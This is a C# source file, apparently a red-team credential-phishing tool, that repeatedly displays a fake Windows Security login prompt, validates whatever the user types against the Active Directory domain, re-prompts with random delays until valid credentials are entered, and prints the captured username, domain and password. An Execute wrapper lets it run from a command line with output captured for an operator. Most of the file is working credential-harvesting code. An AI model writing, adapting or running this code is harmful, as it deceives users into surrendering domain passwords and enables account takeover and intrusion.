using System;
using System.DirectoryServices.AccountManagement;
using System.IO;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace TLAD
{
    static class Program
    {
        [DllImport("shell32.dll", SetLastError = true)]
        static extern IntPtr CommandLineToArgvW([MarshalAs(UnmanagedType.LPWStr)] string lpCmdLine, out int pNumArgs);

        public static string[] CommandLineToArgs(string commandLine)
        {
            int argc;
            var argv = CommandLineToArgvW(commandLine, out argc);
            if (argv == IntPtr.Zero)
            {
                throw new System.ComponentModel.Win32Exception();
            }
            try
            {
                var args = new string[argc];
                for (var i = 0; i < args.Length; i++)
                {
                    var p = Marshal.ReadIntPtr(argv, i * IntPtr.Size);
                    args[i] = Marshal.PtrToStringUni(p);
                }

                return args;
            }
            finally
            {
                Marshal.FreeHGlobal(argv);
            }
        }
        public static string Execute(string commandLine)
        {
            var sw = new StringWriter();
            Console.SetOut(sw);
            Console.SetError(sw);
            Main(CommandLineToArgs(commandLine));
            return sw.ToString();
        }

        [STAThread]
        static void Main(string[] args)
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            var i = 0;
            do
            {
                System.Media.SystemSounds.Exclamation.Play();
                Application.Run(new WindowsSecurity());
                i++;
            }
            while (!Valid() && i < 10);
        }

        static bool Valid()
        {
            var r = new Random();
            if (string.IsNullOrEmpty(CredentialProvider.Password))
            {
                System.Threading.Thread.Sleep(r.Next(750,3000));
                return false;
            }

            try
            {
                using (var context = new PrincipalContext(ContextType.Domain, CredentialProvider.Domain))
                {
                    if (!context.ValidateCredentials(CredentialProvider.Username, CredentialProvider.Password))
                    {
                        System.Threading.Thread.Sleep(r.Next(750, 3000));
                        return false;
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex);
            }
            Console.WriteLine(CredentialProvider.Print());
            return true;
        }
    }
}
